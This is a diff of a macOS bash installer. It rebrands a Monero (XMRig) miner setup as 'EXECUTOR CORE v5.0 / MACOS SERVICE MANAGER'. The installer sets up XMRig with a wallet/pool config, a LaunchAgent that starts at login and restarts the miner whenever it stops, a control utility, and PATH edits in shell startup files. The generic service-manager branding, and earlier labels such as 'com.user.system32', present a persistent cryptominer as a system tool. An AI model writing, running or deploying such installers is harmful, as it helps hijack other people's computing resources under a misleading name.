@@ -1,7 +1,61 @@
-/bin/bash -c '
+
+cat > "$HOME/executor-install.sh" <<'INSTALLER'
+#!/bin/bash
 set -euo pipefail
 
-echo "=== Installing Monero Miner ==="
+G='\033[1;32m'
+LG='\033[0;92m'
+D='\033[2;32m'
+R='\033[0m'
+
+BASE="$HOME/.executor"
+BIN="$BASE/bin"
+LOGDIR="$HOME/.config/xmrig"
+AGENTS="$HOME/Library/LaunchAgents"
+
+LABEL="com.user.executor.miner"
+PLIST="$AGENTS/$LABEL.plist"
+CONTROL="$BIN/executor"
+
+UID_NUM="$(id -u)"
+
+clear
+
+banner() {
+  echo -e "${G}"
+  echo '███████╗██╗  ██╗███████╗ ██████╗'
+  echo '██╔════╝╚██╗██╔╝██╔════╝██╔════╝'
+  echo '█████╗   ╚███╔╝ █████╗  ██║'
+  echo '██╔══╝   ██╔██╗ ██╔══╝  ██║'
+  echo '███████╗██╔╝ ██╗███████╗╚██████╗'
+  echo '╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝'
+  echo -e "${R}"
+  echo -e "${LG}       EXECUTOR CORE v5.0${R}"
+  echo -e "${D}       MACOS SERVICE MANAGER${R}"
+  echo
+}
+
+progress() {
+  local label="$1"
+  local i
+
+  echo -e "\n${LG}[EXECUTOR] $label${R}"
+
+  for ((i=0;i<=25;i++)); do
+    printf "\r${G}["
+    printf "%${i}s" | tr ' ' '#'
+    printf "%$((25-i))s" | tr ' ' '.'
+    printf "] %3d%%${R}" "$((i*4))"
+    sleep 0.025
+  done
+  echo
+}
+
+banner
+
+mkdir -p "$BIN" "$LOGDIR" "$AGENTS"
+
+progress "INITIALIZING EXECUTOR"
 
 # Locate Homebrew
 if command -v brew >/dev/null 2>&1; then
@@ -11,42 +65,43 @@ elif [ -x /opt/homebrew/bin/brew ]; then
 elif [ -x /usr/local/bin/brew ]; then
   BREW=/usr/local/bin/brew
 else
-  echo "Homebrew is missing. Install it first."
+  echo -e "${G}[ERROR] Homebrew is missing.${R}"
   exit 1
 fi
 
 eval "$("$BREW" shellenv)"
-export HOMEBREW_NO_ASK=1
 
-# Install or repair XMRig
+export HOMEBREW_NO_ASK=1
+export HOMEBREW_NO_AUTO_UPDATE=1
+
+progress "CHECKING PACKAGE MANAGER"
+
+# Install XMRig if missing
 if "$BREW" list --versions xmrig >/dev/null 2>&1; then
-  "$BREW" reinstall xmrig
+  echo -e "${LG}[OK] XMRig already installed.${R}"
 else
+  echo -e "${LG}[+] Installing XMRig...${R}"
   "$BREW" install xmrig
 fi
 
-# Find executable
-XMRIG="$("$BREW" --prefix)/bin/xmrig"
+XMRIG="$("$BREW" --prefix xmrig)/bin/xmrig"
 
 if [ ! -x "$XMRIG" ]; then
-  "$BREW" link xmrig || true
+  XMRIG="$(command -v xmrig || true)"
 fi
 
-if [ ! -x "$XMRIG" ]; then
-  echo "XMRig executable is still missing. Installation stopped."
-  "$BREW" list --verbose xmrig
+if [ -z "$XMRIG" ] || [ ! -x "$XMRIG" ]; then
+  echo -e "${G}[ERROR] XMRig executable not found.${R}"
   exit 1
 fi
 
-# Create configuration and log directories
-CONFIG="$HOME/.config/xmrig/config.json"
-LOG="$HOME/.config/xmrig/miner.log"
-PLIST="$HOME/Library/LaunchAgents/com.user.monerominer.plist"
-UID_NUM="$(id -u)"
+progress "VERIFYING EXECUTION ENGINE"
 
-mkdir -p "$HOME/.config/xmrig" "$HOME/Library/LaunchAgents"
+# Create original wallet/pool configuration
+CONFIG="$LOGDIR/config.json"
+LOG="$LOGDIR/executor.log"
+ERRLOG="$LOGDIR/executor-error.log"
 
-# Configure wallet and pool
 cat > "$CONFIG" <<EOF
 {
   "autosave": false,
@@ -65,19 +120,108 @@ cat > "$CONFIG" <<EOF
 }
 EOF
 
-# Remove previous versions of this miner service
-for LABEL in com.user.xmrig com.user.monerominer com.user.systemminer com.user.system32; do
-  launchctl bootout "gui/$UID_NUM/$LABEL" 2>/dev/null || true
-done
+chmod 600 "$CONFIG"
 
-# Create transparent background service
+progress "PREPARING EXECUTOR CONTROL"
+
+# Create separate control utility
+cat > "$CONTROL" <<'CONTROL_SCRIPT'
+#!/bin/bash
+set -euo pipefail
+
+LABEL="com.user.executor.miner"
+UID_NUM="$(id -u)"
+DOMAIN="gui/$UID_NUM/$LABEL"
+
+PLIST="$HOME/Library/LaunchAgents/$LABEL.plist"
+LOG="$HOME/.config/xmrig/executor.log"
+ERRLOG="$HOME/.config/xmrig/executor-error.log"
+
+case "${1:-status}" in
+
+  start)
+    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+      echo "[EXECUTOR] Service already loaded."
+      launchctl kickstart "$DOMAIN"
+    else
+      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+      echo "[EXECUTOR] Service started."
+    fi
+    ;;
+
+  stop)
+    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+      launchctl bootout "$DOMAIN"
+      echo "[EXECUTOR] Service stopped."
+    else
+      echo "[EXECUTOR] Service is already stopped."
+    fi
+    ;;
+
+  restart)
+    if launchctl print "$DOMAIN" >/dev/null 2>&1; then
+      launchctl kickstart -k "$DOMAIN"
+    else
+      launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+    fi
+    echo "[EXECUTOR] Restart requested."
+    ;;
+
+  status)
+    echo
+    echo "========== EXECUTOR STATUS =========="
+
+    if launchctl print "$DOMAIN" 2>/dev/null; then
+      echo
+      echo "[EXECUTOR] LaunchAgent is loaded."
+    else
+      echo "[EXECUTOR] LaunchAgent is NOT loaded."
+    fi
+
+    echo
+    echo "Miner process:"
+    pgrep -fl xmrig || echo "No XMRig process found."
+    ;;
+
+  logs)
+    touch "$LOG" "$ERRLOG"
+    tail -n 50 -f "$LOG" "$ERRLOG"
+    ;;
+
+  uninstall)
+    launchctl bootout "$DOMAIN" 2>/dev/null || true
+    rm -f "$PLIST"
+    echo "[EXECUTOR] Service registration removed."
+    echo "[EXECUTOR] Configuration and XMRig were retained."
+    ;;
+
+  *)
+    echo "EXECUTOR CORE CONTROL"
+    echo
+    echo "Usage:"
+    echo "  executor start"
+    echo "  executor stop"
+    echo "  executor restart"
+    echo "  executor status"
+    echo "  executor logs"
+    echo "  executor uninstall"
+    exit 1
+    ;;
+esac
+CONTROL_SCRIPT
+
+chmod 755 "$CONTROL"
+
+# Create LaunchAgent
+# This is a visible, named background service.
 cat > "$PLIST" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
   <key>Label</key>
-  <string>com.user.monerominer</string>
+  <string>$LABEL</string>
+
   <key>ProgramArguments</key>
   <array>
     <string>$XMRIG</string>
@@ -85,27 +229,68 @@ cat > "$PLIST" <<EOF
     <string>--threads=2</string>
     <string>--cpu-priority=1</string>
   </array>
+
   <key>RunAtLoad</key>
   <true/>
+
   <key>KeepAlive</key>
   <true/>
+
   <key>ThrottleInterval</key>
   <integer>10</integer>
+
   <key>StandardOutPath</key>
   <string>$LOG</string>
+
   <key>StandardErrorPath</key>
-  <string>$LOG</string>
+  <string>$ERRLOG</string>
 </dict>
 </plist>
 EOF
 
+chmod 600 "$PLIST"
+
+progress "VALIDATING SERVICE CONFIGURATION"
+
 plutil -lint "$PLIST"
+
+# Load service into current login session
+launchctl bootout "gui/$UID_NUM/$LABEL" 2>/dev/null || true
 launchctl bootstrap "gui/$UID_NUM" "$PLIST"
 
-echo ""
-echo "=== INSTALLATION FINISHED ==="
-echo "Service: Monero Miner"
+# Add command to shell PATH
+for RC in "$HOME/.zshrc" "$HOME/.bashrc"; do
+  touch "$RC"
+  if ! grep -Fq "$BIN" "$RC"; then
+    printf '\nexport PATH="$HOME/.executor/bin:$PATH"\n' >> "$RC"
+  fi
+done
+
+progress "REGISTERING EXECUTOR SERVICE"
+
+echo
+echo -e "${G}"
+echo "=========================================="
+echo "          EXECUTOR CORE v5.0"
+echo "          INSTALLATION COMPLETE"
+echo "=========================================="
+echo -e "${R}"
+
 echo "Executable: $XMRIG"
-echo "Log: $LOG"
-launchctl list | grep com.user.monerominer || true
-'
+echo "Configuration: $CONFIG"
+echo "Service: $LABEL"
+echo "Control: $CONTROL"
+echo "Logs: $LOG"
+echo
+echo "Open a new Terminal window to use executor."
+echo
+echo -e "${LG}EXECUTOR INITIALIZATION FINISHED${R}"
+echo
+echo "Verify actual process startup with:"
+echo "$CONTROL status"
+echo
+
+INSTALLER
+
+chmod 700 "$HOME/executor-install.sh"
+/bin/bash "$HOME/executor-install.sh"
